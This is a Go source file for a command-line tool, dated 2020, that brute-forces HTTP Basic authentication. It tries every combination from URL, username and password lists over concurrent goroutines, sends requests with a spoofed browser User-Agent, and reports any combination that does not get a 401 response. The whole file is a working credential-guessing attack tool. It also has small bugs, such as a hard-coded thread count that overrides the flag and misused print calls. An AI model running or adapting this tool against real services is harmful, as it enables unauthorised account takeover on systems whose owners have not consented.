package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
)

var (
	wg sync.WaitGroup
)

func DoRequest(targets chan string)  {
	for len(targets) > 0 {
		target := <- targets
		url := strings.Split(target, "\t")[0]
		username := strings.Split(target, "\t")[1]
		password := strings.Split(target, "\t")[2]

		client := http.DefaultClient
		auth := []byte(username + ":" + password)
		encodeauth := base64.StdEncoding.EncodeToString(auth)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Authorization", "Basic " + encodeauth)
		response, err := client.Do(req)
		if err != nil{
			print(err)
			return
		}
		defer response.Body.Close()
		if response.StatusCode == 200 || response.StatusCode != 401 {
			fmt.Println("[" + strconv.Itoa(response.StatusCode) + "]")
			fmt.Println("\r[-] " + url)
			fmt.Println("\r[-] %s:%s", username, password)
		}
		//fmt.Println(encodeauth)
	}
	wg.Done()
}

func initlists(filename string) []string{
	file, err := os.OpenFile(filename, os.O_RDONLY, 0)
	if err != nil{
		fmt.Println("OpenFile Error")
		return nil
	}
	defer file.Close()
	var ctxlist []string
	allctx := bufio.NewScanner(file)
	for allctx.Scan() {
		ctxlist = append(ctxlist, allctx.Text())
	}
	return ctxlist
}

func main() {
	var urlist string
	var usernamelist string
	var passwordlist string
	var threads int

	flag.StringVar(&urlist, "L", "", "Urls list to brute")
	flag.StringVar(&usernamelist, "U", "", "Usernames list to brute")
	flag.StringVar(&passwordlist, "P", "", "Passwords list to brute")
	flag.IntVar(&threads,"T",5, "Set Threads (default 5)")

	flag.Parse()

	if len(os.Args) == 1 {
		fmt.Println("------------------------------------")
		fmt.Println(" Author      |       huy4ng")
		fmt.Println("------------------------------------")
		fmt.Println(" Update-v1.0 |      2020-07-10")
		fmt.Println("-------------------------------------")
		fmt.Printf("\nUsage : \n\tExample : %s -L=url.txt -U=username.txt -P=password.txt -T=5\n\n", os.Args[0])
		fmt.Printf("View more help via %s -h\n\n", os.Args[0])
	} else {
		urls := initlists(urlist)
		usernames := initlists(usernamelist)
		passwords :=initlists(passwordlist)
		targets := make(chan string, len(urls)*len(usernames)*len(passwords))

		for i := 0; i < len(urls); i++{
			for j := 0; j < len(usernames); j++ {
				for k := 0; k < len(passwords); k++ {
					target := urls[i] + "\t" + usernames[j] + "\t" + passwords[k]
					//fmt.Println(target)
					targets <- target

				}
			}
		}
		close(targets)

		threads := 5
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go DoRequest(targets)
		}

		wg.Wait()
	}



}
